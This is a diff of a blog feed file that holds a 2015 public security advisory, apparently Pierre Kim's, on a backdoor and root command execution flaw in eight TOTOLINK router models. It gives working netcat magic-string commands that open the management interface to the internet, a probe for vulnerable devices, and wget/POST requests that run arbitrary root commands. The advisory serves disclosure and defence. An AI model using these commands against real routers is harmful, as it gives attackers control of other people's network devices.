+if you see "GET / HTTP/1.1" in the answer, you likely detected a vulnerable router.
+</code></pre>
+<p><strong>HTTP remote management interface open with the backdoor:</strong></p>
+<p><img alt="" src="images/2015-totolink-0x02-backdoor-01.png" /></p>
+<h2>Details - RCE in the management interface</h2>
+<p>A hidden form in the latest firmware allows an attacker to execute commands as root by sending a HTTP request:</p>
+<pre><code>POST /boafrm/formSysCmd HTTP/1.1
+
+sysCmd=&lt;cmd&gt;&amp;apply=Apply&amp;msg=
+</code></pre>
+<p>An attacker can use wget to execute commands in the remote device:</p>
+<pre><code>wget --post-data='sysCmd=&lt;cmd&gt;&amp;apply=Apply&amp;msg=' http://ip//boafrm/formSysCmd
+</code></pre>
+<p>For instance, sending this HTTP request to the management interface will reboot the device:</p>
+<pre><code>POST /boafrm/formSysCmd HTTP/1.1
+
+sysCmd=reboot&amp;apply=Apply&amp;msg=
+</code></pre>
+<p>This wget command will do the same job:</p>
+<pre><code>wget --post-data='sysCmd=reboot&amp;apply=Apply&amp;msg=' http://ip//boafrm/formSysCmd
+</code></pre>
+<h2>Vendor Response</h2>
+<p>TOTOLINK was not contacted in regard of this case.</p>
+<h2>Report Timeline</h2>
+<ul>
+<li>Jun 25, 2015: Backdoor found by analysing TOTOLINK firmwares.</li>
+<li>Jun 26, 2015: working PoCs with RCE.</li>
+<li>Jul 16, 2015: A public advisory is sent to security mailing lists.</li>
+</ul>
+<h2>Credit</h2>
+<p>These vulnerabilities were found by Alexandre Torres and Pierre Kim (@PierreKimSec).</p>
+<h2>References</h2>
+<p>https://pierrekim.github.io/advisories/2015-totolink-0x02.txt</p>
+<h2>Disclaimer</h2>
+<p>This advisory is licensed under a Creative Commons Attribution Non-Commercial
+Share-Alike 3.0 License: http://creativecommons.org/licenses/by-nc-sa/3.0/</p>
+<p>Complete advisory:</p>
+<pre><code>-----BEGIN PGP SIGNED MESSAGE-----
+Hash: SHA512
+
+## Advisory Information
+
+Title: Backdoor and RCE found in 8 TOTOLINK router models
+Advisory URL: https://pierrekim.github.io/advisories/2015-totolink-0x02.txt
+Blog URL: https://pierrekim.github.io/blog/2015-07-16-backdoor-and-RCE-found-in-8-TOTOLINK-products.html
+Date published: 2015-07-16
+Vendors contacted: None
+Release mode: 0days, Released
+CVE: no current CVE
+
+
+
+## Product Description
+
+TOTOLINK is a brother brand of ipTime which wins over 80% of SOHO markets in South Korea.
+TOTOLINK produces routers, wifi access points and network devices. Their products are sold worldwide.
+
+
+
+## Vulnerabilities Summary
+
+A backdoor is present in several TOTOLINK products.
+This was confirmed by analyzing the latest firmwares and by testing the backdoor against live routers.
+
+At least 8 TOTOLINK products are affected (firmwares come from totolink.net and from totolink.cn):
+
+- A850R-V1 : until last firwmware TOTOLINK-A850R-V1.0.1-B20150707.1612.web
+- F1-V2 : until last firmware F1-V2.1.1-B20150708.1646.web
+- F2-V1 : until last firmware F2-V2.1.0-B20150320.1611.web
+- N150RT-V2 : until last firmware TOTOLINK-N150RT-V2.1.1-B20150708.1548.web
+- N151RT-V2 : until last firmware TOTOLINK-N151RT-V2.1.1-B20150708.1559.web
+- N300RH-V2 : until last firmware TOTOLINK-N300RH-V2.0.1-B20150708.1625.web
+- N300RH-V3 : until last firmware TOTOLINK-N300RH-V3.0.0-B20150331.0858.web
+- N300RT-V2 : until last firmware TOTOLINK-N300RT-V2.1.1-B20150708.1613.web
+
+
+By sending a crafted request to the WAN IP, an attacker will open the HTTP remote management interface on the Internet.
+Then an attacker can use a Remote Code Execution in the HTTP remote management interface by using the hidden /boafrm/formSysCmd form, bypassing the authentication system.
+
+We estimate there are =~ 50 000 routers affected by this backdoor.
+
+
+
+## Details - backdoor
+
+The init.d script executes the /bin/skt binary when the router starts:
+
+cat etc/init.d/rcS
+[...]
+# start web server
+boa
+skt&amp;
+
+
+skt is a small MIPS binary which is a client/server program. The arguments are:
+
+server: ./skt
+client: ./skt host cmd
+
+
+The binary can be used in x86_64 machines using QEMU: sudo chroot . ./qemu-mips-static ./bin/skt
+
+Using skt without argument will launch a TCP daemon on port 5555 in every interface (including WAN), acting as an ECHO server.
+Using skt with arguments will send a TCP packet containing the command to the specified IP on port 5555.
+
+The analysis of the binary running on the TOTOLINK devices (for more details, read
+http://pierrekim.github.io/blog/2015-07-16-backdoor-and-RCE-found-in-8-TOTOLINK-products.html ) shows the server mode responds to 3 commands by silently executing
+system() in the background:
+
+
+o By sending "hel,xasf" to the device, the device will execute: iptables -I INPUT -p tcp --dport 80 -i eth1 -j ACCEPT
+
+This will open the HTTP remote management interface on port 80 in the eth1 interface which is the WAN interface by default.
+
+
+o By sending "oki,xasf" to the device, the device will execute: iptables -D INPUT -p tcp --dport 80 -i eth1 -j ACCEPT
+
+This will close the HTTP remote management interface.
+
+
+o By sending "bye,xasf" to the device, the device will do nothing
+
+
+The iptables commands in the backdoor are hardcoded with "eth1".
+Only devices using DHCP and static IP connections are affected because the WAN IP is attached on the eth1 device.
+
+It does not affect devices using PPPoE connections, because the WAN IP is attached on the ppp device, as seen below:
+
+totolink# ifconfig
+ppp0      Link encap:Point-to-Point Protocol
+inet addr:X.X.X.X  P-t-P:X.X.X.X  Mask:255.255.255.255
+UP POINTOPOINT RUNNING NOARP MULTICAST  MTU:1438  Metric:1
+RX packets:17308398 errors:0 dropped:0 overruns:0 frame:0
+TX packets:2605290 errors:0 dropped:0 overruns:0 carrier:0
+collisions:0 txqueuelen:64
+RX bytes:2803138455 (2.6 GiB)  TX bytes:277402492 (264.5 MiB)
+
+
+
+An attacker can use these simple netcat commands to test the backdoor:
+
+To open the HTTP remote management interface on the Internet:
+
+echo -ne "hel,xasf" | nc &lt;ip&gt; 5555
+
+To close the HTTP remote management interface on the Internet:
+
+echo -ne "oki,xasf" | nc &lt;ip&gt; 5555
+
+To detect a vulnerable router:
+
+echo -ne "GET / HTTP/1.1" | nc &lt;ip&gt; 5555
+
+if you see "GET / HTTP/1.1" in the answer, you likely detected a vulnerable router.
+
+
+## Details - RCE in the management interface
+
+A hidden form in the latest firmware allows an attacker to execute commands as root by sending a HTTP request:
+
+
+POST /boafrm/formSysCmd HTTP/1.1
+
+sysCmd=&lt;cmd&gt;&amp;apply=Apply&amp;msg=
+
+
+An attacker can use wget to execute commands in the remote device:
+
+wget --post-data='sysCmd=&lt;cmd&gt;&amp;apply=Apply&amp;msg=' http://ip//boafrm/formSysCmd
+
+
+For instance, sending this HTTP request to the management interface will reboot the device:
+
+
+POST /boafrm/formSysCmd HTTP/1.1
+
+sysCmd=reboot&amp;apply=Apply&amp;msg=
+
+This wget command will do the same job:
+
+wget --post-data='sysCmd=reboot&amp;apply=Apply&amp;msg=' http://ip//boafrm/formSysCmd
+
+
+
+## Vendor Response
+
+TOTOLINK was not contacted in regard of this case.
+
+
+
+## Report Timeline
+
+* Jun 25, 2015: Backdoor found by analysing TOTOLINK firmwares.
+* Jun 26, 2015: Working PoCs with RCE.
+* Jul 13, 2015: Updated firmwares confirmed vulnerable.
+* Jul 16, 2015: A public advisory is sent to security mailing lists.
+
+
+
+## Credit
+
+These vulnerabilities were found by Alexandre Torres and Pierre Kim (@PierreKimSec).
+
+
+
+## References
+
+https://pierrekim.github.io/advisories/2015-totolink-0x02.txt
+https://pierrekim.github.io/blog/2015-07-16-backdoor-and-RCE-found-in-8-TOTOLINK-products.html
+
+
+
+## Disclaimer
+
+This advisory is licensed under a Creative Commons Attribution Non-Commercial
+Share-Alike 3.0 License: http://creativecommons.org/licenses/by-nc-sa/3.0/
+
+
+-----BEGIN PGP SIGNATURE-----
+Version: GnuPG v1
+
+iQIcBAEBCgAGBQJVq/MLAAoJEMQ+Dtp9ky28bGEQAKcXghQtecYt4bSd+isQ7zh8
+8z6Q05F5fiReKaXSR2dFlBhulsq6o5TjIQsGB2mG/2GOthqn7KHNYwVMSGrdYNd6
+lmOD3yPnGl3c2SyuiabUEYk7FvoyZ2g71mxxyie4/dV7I3jir2DGToInjEp0IXgU
+hM6CeTFoTO5y9Z6VYHaaxI2POgqD9OojmL+1oE7h3bMiMoOftXeDh1IUSLpQddHa
+wBDHWhLXXJYNxv2vWubJaefv6gRomeaapLjODCMiMJX0Br4EZ9gzpzonOEGG+I8z
+gRwl+JO0CrxDhysiyMayU5uPsifomcWVXaEEZRdTMWDfWH0qB/f0/2zbFVMVzCVk
+17AedQyoPXWELhS7i9afZ2JCylcEHLgMhQeDQG48lQf4SCFxCyKD09pVnG13lsUC
+Ee2EQB5A7FkqcwAbq7xRnZuMd/Lpl/RuSKIby7VbqfcI1MDnKoKt9XQ9lLIulQvk
+WRnMgUxoyQ8fFzFn265qvb3a3RSWc+Yl8xRUky4IZ3jd+nbEqHdPWCKSG4D2C45J
+NHpyeY+aZ2p/hxCfJckJtzYdcZGXSVfO2FU0rr94K9XAeWXj3+RP3DOKGoTRLZCT
+7OxaHVHiB7aLXS2qta4EBYyjFVHJZOmlcyjYcKY/RhMGomWvoUegG3z7eAbjaoj0
+k2ILiaGzfv4z+aJ/iI05
+=z70S
 -----END PGP SIGNATURE-----
 </code></pre></content>
     </entry>
@@ -9376,346 +9827,6 @@ gqQZRaveyQK+sOJdiCwgMTR4wsi3hoY+1UlntKil+XW0+Vf9arDwaTzrJs2zn1Us
 qYspmrBsBibG4T4W/reCIGU3lTNyiOWi80qGgqzab0k2/MLU23YB6ktwz8AxzpTv
 rXDUveDVcMt/YxA9/nKu
 =XzCM
------END PGP SIGNATURE-----
-</code></pre></content>
-    </entry>
-    
-    <entry>
-        <title>Backdoor and RCE found in 8 TOTOLINK router models</title>
-        <link href="2015-07-16-backdoor-and-RCE-found-in-8-TOTOLINK-products.html"/>
-        <content type="html"><h2>Product Description</h2>
-<p>TOTOLINK is a brother brand of ipTime which wins over 80% of SOHO markets in South Korea.
-TOTOLINK produces routers, wifi access points and network devices. Their products are sold worldwide.</p>
-<h2>Vulnerabilities Summary</h2>
-<p>A backdoor is present in several TOTOLINK products.
-This was confirmed by analyzing the latest firmwares and by testing the backdoor against live routers.</p>
-<p>At least 8 TOTOLINK products are affected (firmwares come from totolink.net and from totolink.cn):</p>
-<ul>
-<li>A850R-V1 : until last firwmware TOTOLINK-A850R-V1.0.1-B20150707.1612.web</li>
-<li>F1-V2 : until last firmware F1-V2.1.1-B20150708.1646.web</li>
-<li>F2-V1 : until last firmware F2-V2.1.0-B20150320.1611.web</li>
-<li>N150RT-V2 : until last firmware TOTOLINK-N150RT-V2.1.1-B20150708.1548.web</li>
-<li>N151RT-V2 : until last firmware TOTOLINK-N151RT-V2.1.1-B20150708.1559.web</li>
-<li>N300RH-V2 : until last firmware TOTOLINK-N300RH-V2.0.1-B20150708.1625.web</li>
-<li>N300RH-V3 : until last firmware TOTOLINK-N300RH-V3.0.0-B20150331.0858.web</li>
-<li>N300RT-V2 : until last firmware TOTOLINK-N300RT-V2.1.1-B20150708.1613.web</li>
-</ul>
-<p>By sending a crafted request to the WAN IP, an attacker will open the HTTP remote management interface on the Internet.
-Then an attacker can use a Remote Code Execution in the HTTP remote management interface by using the hidden /boafrm/formSysCmd form, bypassing the authentication system.</p>
-<p>We estimate there are =~ 50 000 routers affected by this backdoor.</p>
-<h2>Details - backdoor</h2>
-<p>The /etc/init.d/rcS script executes the /bin/skt binary when the router starts:</p>
-<pre><code>cat etc/init.d/rcS
-[...]
-# start web server
-boa
-skt&amp;
-</code></pre>
-<p>skt is a small MIPS binary which is a client/server program. The arguments are:</p>
-<pre><code>server: ./skt
-client: ./skt host cmd
-</code></pre>
-<p>The binary can be used in x86_64 machines using QEMU: sudo chroot . ./qemu-mips-static ./bin/skt</p>
-<p>Using skt without argument will launch a TCP daemon on port 5555 in every interface (including WAN), acting as an ECHO server.
-Using skt with arguments will send a TCP packet containing the command to the specified IP on port 5555.</p>
-<p>There are 2 main functions in <code>skt</code>:</p>
-<ul>
-<li>TcpClient is a simple TCP client.</li>
-<li>TcpServer looks like an echo server.</li>
-</ul>
-<p><strong>TcpClient:</strong></p>
-<p>It will send a TCP packet containing hel,xasf, oki,xasf or bye,xasf, depending the arguments used (1,2,3), to a remote IP on port 5555.</p>
-<p><strong>TcpServer:</strong></p>
-<p>TcpServer is an echo server listening on port 5555/tcp and  it compares strings provided by the user with hardcoded
-strings ("hel,xasf", "oki,xasf").</p>
-<p>The problem is in the sub_400B50 function:</p>
-<p><img alt="" src="images/2015-totolink-0x02-backdoor-00.png" /></p>
-<p><strong>Pseudo-code of sub_400B50:</strong></p>
-<pre><code>int32_t sub_400B50(int32_t a1, char *str, int32_t a3, int32_t a4, int32_t a5) {
-    if (strcmp(str, "hel,xasf") == 0) {
-        system("iptables -I INPUT -p tcp --dport 80 -i eth1 -j ACCEPT");
-    } else {
-        if (strcmp(str, "oki,xasf") == 0) {
-            system("iptables -D INPUT -p tcp --dport 80 -i eth1 -j ACCEPT");
-        }
-    }
-    [...]
-}
-</code></pre>
-<p>This function compares str, which is an user-given string, with 2 hardcoded strings to execute system().</p>
-<p>The analysis of the binary running on the TOTOLINK devices shows the server mode responds to 3 commands by silently executing
-system() in the background:</p>
-<ul>
-<li>
-<p>By sending "hel,xasf" to the device, the device will execute:</p>
-<p>iptables -I INPUT -p tcp --dport 80 -i eth1 -j ACCEPT</p>
-<p>This will open the HTTP remote management interface on port 80 in the eth1 interface which is the WAN interface by default.</p>
-</li>
-<li>
-<p>By sending "oki,xasf" to the device, the device will execute:</p>
-<p>iptables -D INPUT -p tcp --dport 80 -i eth1 -j ACCEPT </p>
-<p>This will close the HTTP remote management interface.</p>
-</li>
-<li>
-<p>By sending "bye,xasf" (hardcoded string in the binary) to the device, the device will do nothing</p>
-</li>
-</ul>
-<p>The iptables commands in the backdoor are hardcoded with "eth1".
-Only devices using DHCP and static IP connections are affected because the WAN IP is attached on the eth1 device.</p>
-<p>It does not affect devices using PPPoE connections, because the WAN IP is attached on the ppp device, as seen below:</p>
-<pre><code>totolink# ifconfig
-ppp0      Link encap:Point-to-Point Protocol  
-          inet addr:X.X.X.X  P-t-P:X.X.X.X  Mask:255.255.255.255
-          UP POINTOPOINT RUNNING NOARP MULTICAST  MTU:1438  Metric:1
-          RX packets:17308398 errors:0 dropped:0 overruns:0 frame:0
-          TX packets:2605290 errors:0 dropped:0 overruns:0 carrier:0
-          collisions:0 txqueuelen:64 
-          RX bytes:2803138455 (2.6 GiB)  TX bytes:277402492 (264.5 MiB)
-</code></pre>
-<p>An attacker can use these simple netcat commands to test the backdoor:</p>
-<p>To open the HTTP remote management interface on the Internet:</p>
-<pre><code>echo -ne "hel,xasf" | nc &lt;ip&gt; 5555
-</code></pre>
-<p>To close the HTTP remote management interface on the Internet:</p>
-<pre><code>echo -ne "oki,xasf" | nc &lt;ip&gt; 5555
-</code></pre>
-<p>To detect a vulnerable router:</p>
-<pre><code>echo -ne "GET / HTTP/1.1" | nc &lt;ip&gt; 5555
-
-if you see "GET / HTTP/1.1" in the answer, you likely detected a vulnerable router.
-</code></pre>
-<p><strong>HTTP remote management interface open with the backdoor:</strong></p>
-<p><img alt="" src="images/2015-totolink-0x02-backdoor-01.png" /></p>
-<h2>Details - RCE in the management interface</h2>
-<p>A hidden form in the latest firmware allows an attacker to execute commands as root by sending a HTTP request:</p>
-<pre><code>POST /boafrm/formSysCmd HTTP/1.1
-
-sysCmd=&lt;cmd&gt;&amp;apply=Apply&amp;msg=
-</code></pre>
-<p>An attacker can use wget to execute commands in the remote device:</p>
-<pre><code>wget --post-data='sysCmd=&lt;cmd&gt;&amp;apply=Apply&amp;msg=' http://ip//boafrm/formSysCmd
-</code></pre>
-<p>For instance, sending this HTTP request to the management interface will reboot the device:</p>
-<pre><code>POST /boafrm/formSysCmd HTTP/1.1
-
-sysCmd=reboot&amp;apply=Apply&amp;msg=
-</code></pre>
-<p>This wget command will do the same job:</p>
-<pre><code>wget --post-data='sysCmd=reboot&amp;apply=Apply&amp;msg=' http://ip//boafrm/formSysCmd
-</code></pre>
-<h2>Vendor Response</h2>
-<p>TOTOLINK was not contacted in regard of this case.</p>
-<h2>Report Timeline</h2>
-<ul>
-<li>Jun 25, 2015: Backdoor found by analysing TOTOLINK firmwares.</li>
-<li>Jun 26, 2015: working PoCs with RCE.</li>
-<li>Jul 16, 2015: A public advisory is sent to security mailing lists.</li>
-</ul>
-<h2>Credit</h2>
-<p>These vulnerabilities were found by Alexandre Torres and Pierre Kim (@PierreKimSec).</p>
-<h2>References</h2>
-<p>https://pierrekim.github.io/advisories/2015-totolink-0x02.txt</p>
-<h2>Disclaimer</h2>
-<p>This advisory is licensed under a Creative Commons Attribution Non-Commercial
-Share-Alike 3.0 License: http://creativecommons.org/licenses/by-nc-sa/3.0/</p>
-<p>Complete advisory:</p>
-<pre><code>-----BEGIN PGP SIGNED MESSAGE-----
-Hash: SHA512
-
-## Advisory Information
-
-Title: Backdoor and RCE found in 8 TOTOLINK router models
-Advisory URL: https://pierrekim.github.io/advisories/2015-totolink-0x02.txt
-Blog URL: https://pierrekim.github.io/blog/2015-07-16-backdoor-and-RCE-found-in-8-TOTOLINK-products.html
-Date published: 2015-07-16
-Vendors contacted: None
-Release mode: 0days, Released
-CVE: no current CVE
-
-
-
-## Product Description
-
-TOTOLINK is a brother brand of ipTime which wins over 80% of SOHO markets in South Korea.
-TOTOLINK produces routers, wifi access points and network devices. Their products are sold worldwide.
-
-
-
-## Vulnerabilities Summary
-
-A backdoor is present in several TOTOLINK products.
-This was confirmed by analyzing the latest firmwares and by testing the backdoor against live routers.
-
-At least 8 TOTOLINK products are affected (firmwares come from totolink.net and from totolink.cn):
-
-- A850R-V1 : until last firwmware TOTOLINK-A850R-V1.0.1-B20150707.1612.web
-- F1-V2 : until last firmware F1-V2.1.1-B20150708.1646.web
-- F2-V1 : until last firmware F2-V2.1.0-B20150320.1611.web
-- N150RT-V2 : until last firmware TOTOLINK-N150RT-V2.1.1-B20150708.1548.web
-- N151RT-V2 : until last firmware TOTOLINK-N151RT-V2.1.1-B20150708.1559.web
-- N300RH-V2 : until last firmware TOTOLINK-N300RH-V2.0.1-B20150708.1625.web
-- N300RH-V3 : until last firmware TOTOLINK-N300RH-V3.0.0-B20150331.0858.web
-- N300RT-V2 : until last firmware TOTOLINK-N300RT-V2.1.1-B20150708.1613.web
-
-
-By sending a crafted request to the WAN IP, an attacker will open the HTTP remote management interface on the Internet.
-Then an attacker can use a Remote Code Execution in the HTTP remote management interface by using the hidden /boafrm/formSysCmd form, bypassing the authentication system.
-
-We estimate there are =~ 50 000 routers affected by this backdoor.
-
-
-
-## Details - backdoor
-
-The init.d script executes the /bin/skt binary when the router starts:
-
-cat etc/init.d/rcS
-[...]
-# start web server
-boa
-skt&amp;
-
-
-skt is a small MIPS binary which is a client/server program. The arguments are:
-
-server: ./skt
-client: ./skt host cmd
-
-
-The binary can be used in x86_64 machines using QEMU: sudo chroot . ./qemu-mips-static ./bin/skt
-
-Using skt without argument will launch a TCP daemon on port 5555 in every interface (including WAN), acting as an ECHO server.
-Using skt with arguments will send a TCP packet containing the command to the specified IP on port 5555.
-
-The analysis of the binary running on the TOTOLINK devices (for more details, read
-http://pierrekim.github.io/blog/2015-07-16-backdoor-and-RCE-found-in-8-TOTOLINK-products.html ) shows the server mode responds to 3 commands by silently executing
-system() in the background:
-
-
-o By sending "hel,xasf" to the device, the device will execute: iptables -I INPUT -p tcp --dport 80 -i eth1 -j ACCEPT
-
-This will open the HTTP remote management interface on port 80 in the eth1 interface which is the WAN interface by default.
-
-
-o By sending "oki,xasf" to the device, the device will execute: iptables -D INPUT -p tcp --dport 80 -i eth1 -j ACCEPT
-
-This will close the HTTP remote management interface.
-
-
-o By sending "bye,xasf" to the device, the device will do nothing
-
-
-The iptables commands in the backdoor are hardcoded with "eth1".
-Only devices using DHCP and static IP connections are affected because the WAN IP is attached on the eth1 device.
-
-It does not affect devices using PPPoE connections, because the WAN IP is attached on the ppp device, as seen below:
-
-totolink# ifconfig
-ppp0      Link encap:Point-to-Point Protocol
-inet addr:X.X.X.X  P-t-P:X.X.X.X  Mask:255.255.255.255
-UP POINTOPOINT RUNNING NOARP MULTICAST  MTU:1438  Metric:1
-RX packets:17308398 errors:0 dropped:0 overruns:0 frame:0
-TX packets:2605290 errors:0 dropped:0 overruns:0 carrier:0
-collisions:0 txqueuelen:64
-RX bytes:2803138455 (2.6 GiB)  TX bytes:277402492 (264.5 MiB)
-
-
-
-An attacker can use these simple netcat commands to test the backdoor:
-
-To open the HTTP remote management interface on the Internet:
-
-echo -ne "hel,xasf" | nc &lt;ip&gt; 5555
-
-To close the HTTP remote management interface on the Internet:
-
-echo -ne "oki,xasf" | nc &lt;ip&gt; 5555
-
-To detect a vulnerable router:
-
-echo -ne "GET / HTTP/1.1" | nc &lt;ip&gt; 5555
-
-if you see "GET / HTTP/1.1" in the answer, you likely detected a vulnerable router.
-
-
-## Details - RCE in the management interface
-
-A hidden form in the latest firmware allows an attacker to execute commands as root by sending a HTTP request:
-
-
-POST /boafrm/formSysCmd HTTP/1.1
-
-sysCmd=&lt;cmd&gt;&amp;apply=Apply&amp;msg=
-
-
-An attacker can use wget to execute commands in the remote device:
-
-wget --post-data='sysCmd=&lt;cmd&gt;&amp;apply=Apply&amp;msg=' http://ip//boafrm/formSysCmd
-
-
-For instance, sending this HTTP request to the management interface will reboot the device:
-
-
-POST /boafrm/formSysCmd HTTP/1.1
-
-sysCmd=reboot&amp;apply=Apply&amp;msg=
-
-This wget command will do the same job:
-
-wget --post-data='sysCmd=reboot&amp;apply=Apply&amp;msg=' http://ip//boafrm/formSysCmd
-
-
-
-## Vendor Response
-
-TOTOLINK was not contacted in regard of this case.
-
-
-
-## Report Timeline
-
-* Jun 25, 2015: Backdoor found by analysing TOTOLINK firmwares.
-* Jun 26, 2015: Working PoCs with RCE.
-* Jul 13, 2015: Updated firmwares confirmed vulnerable.
-* Jul 16, 2015: A public advisory is sent to security mailing lists.
-
-
-
-## Credit
-
-These vulnerabilities were found by Alexandre Torres and Pierre Kim (@PierreKimSec).
-
-
-
-## References
-
-https://pierrekim.github.io/advisories/2015-totolink-0x02.txt
-https://pierrekim.github.io/blog/2015-07-16-backdoor-and-RCE-found-in-8-TOTOLINK-products.html
-
-
-
-## Disclaimer
-
-This advisory is licensed under a Creative Commons Attribution Non-Commercial
-Share-Alike 3.0 License: http://creativecommons.org/licenses/by-nc-sa/3.0/
-
-
------BEGIN PGP SIGNATURE-----
-Version: GnuPG v1
-
-iQIcBAEBCgAGBQJVq/MLAAoJEMQ+Dtp9ky28bGEQAKcXghQtecYt4bSd+isQ7zh8
-8z6Q05F5fiReKaXSR2dFlBhulsq6o5TjIQsGB2mG/2GOthqn7KHNYwVMSGrdYNd6
-lmOD3yPnGl3c2SyuiabUEYk7FvoyZ2g71mxxyie4/dV7I3jir2DGToInjEp0IXgU
-hM6CeTFoTO5y9Z6VYHaaxI2POgqD9OojmL+1oE7h3bMiMoOftXeDh1IUSLpQddHa
-wBDHWhLXXJYNxv2vWubJaefv6gRomeaapLjODCMiMJX0Br4EZ9gzpzonOEGG+I8z
-gRwl+JO0CrxDhysiyMayU5uPsifomcWVXaEEZRdTMWDfWH0qB/f0/2zbFVMVzCVk
-17AedQyoPXWELhS7i9afZ2JCylcEHLgMhQeDQG48lQf4SCFxCyKD09pVnG13lsUC
-Ee2EQB5A7FkqcwAbq7xRnZuMd/Lpl/RuSKIby7VbqfcI1MDnKoKt9XQ9lLIulQvk
-WRnMgUxoyQ8fFzFn265qvb3a3RSWc+Yl8xRUky4IZ3jd+nbEqHdPWCKSG4D2C45J
-NHpyeY+aZ2p/hxCfJckJtzYdcZGXSVfO2FU0rr94K9XAeWXj3+RP3DOKGoTRLZCT
-7OxaHVHiB7aLXS2qta4EBYyjFVHJZOmlcyjYcKY/RhMGomWvoUegG3z7eAbjaoj0
-k2ILiaGzfv4z+aJ/iI05
-=z70S
 -----END PGP SIGNATURE-----
 </code></pre></content>
     </entry>
